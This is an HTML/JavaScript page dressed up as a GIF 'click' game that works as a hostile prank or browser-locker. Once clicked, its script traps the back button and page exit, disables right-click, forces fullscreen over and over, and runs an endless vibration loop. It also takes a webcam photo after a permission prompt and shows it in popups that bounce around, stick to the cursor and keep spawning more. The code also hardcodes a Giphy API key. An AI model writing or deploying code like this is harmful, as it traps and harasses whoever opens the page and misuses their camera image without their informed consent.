<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>JANNNMG</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: 'Times New Roman', Times, serif;
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
        .main-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #mainButton {
            width: 480px;
            height: 300px;
            cursor: pointer;
            border: 5px solid #333;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s ease;
        }
        #mainButton:hover {
            transform: scale(1.05);
        }
        #centerClick {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 84px;
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 8px #000;
            z-index: 100;
            font-family: 'Times New Roman', Times, serif;
        }
        .random-image {
            position: absolute;
            object-fit: cover;
            border: 2px solid rgba(0,0,0,0.3);
            z-index: 1;
        }
        #fullscreenContent {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('assets/game-over.gif');
            background-size: cover;
            background-position: center;
            display: none;
            z-index: 1000;
            cursor: pointer;
        }
        #cameraPermissionModal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        #cameraPermissionContent {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
        }
        #cameraPermissionContent h2 {
            margin-top: 0;
            color: #333;
        }
        #cameraPermissionContent button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        #allowButton {
            background-color: #4CAF50;
            color: white;
        }
        #denyButton {
            background-color: #f44336;
            color: white;
        }
        #videoElement {
            display: none;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <button id="mainButton">
        </button>
    </div>

    <div id="fullscreenContent">
        <audio id="bgMusic" loop>
            <source src="assets/game-over-sound.mp3" type="audio/mpeg">
        </audio>
    </div>

    <div id="cameraPermissionModal">
        <div id="cameraPermissionContent">
            <h2>Webcam and Microphone Permission</h2>
            <p>To continue, you must allow access to your webcam and microphone.</p>
            <button id="allowButton">Allow</button>
            <button id="denyButton">Deny</button>
        </div>
    </div>

    <video id="videoElement" autoplay></video>

    <script>
        document.title = 'JANNNMG';

        const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        let sessionActive = false;
        let cameraStream = null;
        let capturedImage = null;

        const mainButton = document.getElementById('mainButton');
        const fullscreenContent = document.getElementById('fullscreenContent');
        const bgMusic = document.getElementById('bgMusic');
        const cameraPermissionModal = document.getElementById('cameraPermissionModal');
        const allowButton = document.getElementById('allowButton');
        const denyButton = document.getElementById('denyButton');
        const videoElement = document.getElementById('videoElement');

        const gifKeywords = [
            'glitch', 'surreal', 'abstract', 'psychedelic', 'trippy', 'weird', 'strange art', 'unexplained', 'anomaly', 'cosmic horror',
            'eldritch', 'fractal', 'kaleidoscope', 'subconscious', 'distorted', 'melting', 'void', 'liminal space', 'interdimensional', 'bioluminescent',
            'geometric patterns', 'hypnotic', 'optical illusion', 'vaporwave', 'synthwave', 'robot dance', 'toaster explosion', 'chaos', 'entropy', 'quantum foam'
        ];

        const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';

        function startVibrationLoop() {
            if ('vibrate' in navigator) {
                setInterval(() => {
                    navigator.vibrate([500, 1000]);
                }, 1500);
            }
        }

        function generateRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }

        async function getRandomGif() {
            try {
                const randomKeyword = gifKeywords[Math.floor(Math.random() * gifKeywords.length)];
                const response = await fetch(`https://api.giphy.com/v1/gifs/random?api_key=${GIPHY_API_KEY}&tag=${randomKeyword}&rating=g`);
                const data = await response.json();
                return data.data.images.fixed_height.url;
            } catch (error) {
                console.error('Error fetching GIF:', error);
                const randomSeed = Math.random().toString(36).substring(2, 15);
                return `https://picsum.photos/seed/${randomSeed}/200/200.jpg`;
            }
        }

        function getLocalGif(index) {
            return `assets/local-gif-${index}.gif`;
        }

        async function setRandomButtonContent() {
            mainButton.style.cursor = 'wait';
            mainButton.style.backgroundColor = generateRandomColor();
            mainButton.innerHTML = '';

            const numberOfGifs = 8;
            const numberOfImages = 8;
            const gifPromises = [];

            for (let i = 0; i < numberOfGifs; i++) {
                const useLocalGif = Math.random() > 0.7;
                
                if (useLocalGif) {
                    gifPromises.push(Promise.resolve(getLocalGif(i % 5 + 1)));
                } else {
                    gifPromises.push(getRandomGif());
                }
            }

            try {
                const gifUrls = await Promise.all(gifPromises);
                
                for (let i = 0; i < numberOfGifs; i++) {
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    img.style.objectFit = 'cover';
                    
                    img.src = gifUrls[i];
                    
                    img.onerror = function() {
                        const randomSeed = Math.random().toString(36).substring(2, 15);
                        this.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    };
                    
                    mainButton.appendChild(img);
                }

                for (let i = 0; i < numberOfImages; i++) {
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    const randomSeed = Math.random().toString(36).substring(2, 15);
                    img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    img.style.objectFit = 'cover';
                    
                    mainButton.appendChild(img);
                }

            } catch (error) {
                console.error('Error setting button content:', error);
                for (let i = 0; i < 16; i++) {
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    const randomSeed = Math.random().toString(36).substring(2, 15);
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    
                    mainButton.appendChild(img);
                }
            }

            const centerClickSpan = document.createElement('span');
            centerClickSpan.id = 'centerClick';
            centerClickSpan.innerText = 'click';
            mainButton.appendChild(centerClickSpan);
            
            mainButton.style.cursor = 'pointer';
        }

        function requestFullScreenMode() {
            const elem = document.documentElement;
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {});
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                }
            }
        }

        function startSession() {
            if (sessionActive) return;
            sessionActive = true;

            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function (event) {
                history.pushState(null, null, location.href);
            });

            window.addEventListener('beforeunload', function (e) {
                const message = "?";
                e.preventDefault();
                e.returnValue = message;
                return message;
            });

            document.addEventListener('contextmenu', e => e.preventDefault());

            window.addEventListener('blur', () => {
                setTimeout(() => window.focus(), 0);
            });

            if (isMobileDevice) {
                const stateCheckInterval = setInterval(() => {
                    if (sessionActive) {
                        requestFullScreenMode();
                    }
                }, 100);
            }
        }

        function captureImage() {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            
            capturedImage = canvas.toDataURL('image/png');
            
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            
            openPopupWithImage();
        }

        function openPopupWithImage() {
            const popupWindow = window.open('', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
            
            const popupHTML = `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <title>JANNNMG</title>
                    <style>
                        body {
                            margin: 0;
                            padding: 0;
                            width: 350px;
                            height: 350px;
                            background-image: url('${capturedImage}');
                            background-size: cover;
                            background-position: center;
                            overflow: hidden;
                            cursor: none;
                        }
                    </style>
                </head>
                <body>
                    <audio id="popupSound">
                        <source src="assets/game-over-sound.mp3" type="audio/mpeg">
                    </audio>
                    
                    <script>
                        let x = Math.random() * (screen.availWidth - 350);
                        let y = Math.random() * (screen.availHeight - 350);
                        let vx = (Math.random() - 0.5) * 10;
                        let vy = (Math.random() - 0.5) * 10;
                        let stuckToCursor = false;
                        
                        const popupSound = document.getElementById('popupSound');
                        
                        function animate() {
                            if (!stuckToCursor) {
                                const screenWidth = screen.availWidth;
                                const screenHeight = screen.availHeight;
                                const windowWidth = window.outerWidth;
                                const windowHeight = window.outerHeight;

                                x += vx;
                                y += vy;

                                if (x + windowWidth > screenWidth || x < 0) {
                                    vx = -vx;
                                }
                                if (y + windowHeight > screenHeight || y < 0) {
                                    vy = -vy;
                                }

                                window.moveTo(x, y);
                            }
                            
                            requestAnimationFrame(animate);
                        }
                        
                        function createNewPopup() {
                            setTimeout(() => {
                                window.open('', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                                createNewPopup();
                            }, Math.random() * 2000 + 4000);
                        }
                        
                        document.addEventListener('mousemove', function(e) {
                            if (stuckToCursor) {
                                window.moveTo(e.screenX - 175, e.screenY - 175);
                            }
                        });

                        document.body.addEventListener('mouseenter', function() {
                            stuckToCursor = true;
                        });

                        document.body.addEventListener('mouseleave', function() {
                            stuckToCursor = false;
                        });
                        
                        document.body.addEventListener('click', function() {
                            window.open('', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                        });
                        
                        window.onload = function() {
                            animate();
                            createNewPopup();
                            popupSound.play();
                        };
                    <\/script>
                </body>
                </html>
            `;
            
            popupWindow.document.write(popupHTML);
            popupWindow.document.close();
        }

        async function requestCameraAccess() {
            return new Promise((resolve, reject) => {
                cameraPermissionModal.style.display = 'flex';
                
                allowButton.onclick = async function() {
                    cameraPermissionModal.style.display = 'none';
                    
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: true, 
                            audio: true 
                        });
                        
                        cameraStream = stream;
                        
                        videoElement.srcObject = stream;
                        
                        setTimeout(() => {
                            captureImage();
                            resolve(true);
                        }, 1000);
                        
                    } catch (error) {
                        console.error('Camera access error:', error);
                        openDefaultPopup();
                        resolve(false);
                    }
                };
                
                denyButton.onclick = function() {
                    cameraPermissionModal.style.display = 'none';
                    openDefaultPopup();
                    resolve(false);
                };
            });
        }

        function openDefaultPopup() {
            window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
        }

        async function triggerFullScreen() {
            startVibrationLoop();

            await requestCameraAccess();

            startSession();
            requestFullScreenMode();
            fullscreenContent.style.display = 'block';
            bgMusic.play();
            
            if (isMobileDevice) {
                document.addEventListener('backbutton', function(e) {
                    e.preventDefault();
                    if (confirm("?")) {
                        fullscreenContent.style.display = 'none';
                        bgMusic.pause();
                    }
                }, false);
            }
        }

        fullscreenContent.addEventListener('click', function() {
            if (!isMobileDevice) {
                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
            }
        });
        
        document.addEventListener('fullscreenchange', function() {
            if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                if (!isMobileDevice) {
                    window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                }
            }
        });

        setRandomButtonContent();
        mainButton.addEventListener('click', triggerFullScreen);
        document.addEventListener('keydown', triggerFullScreen);
    </script>
</body>
</html>
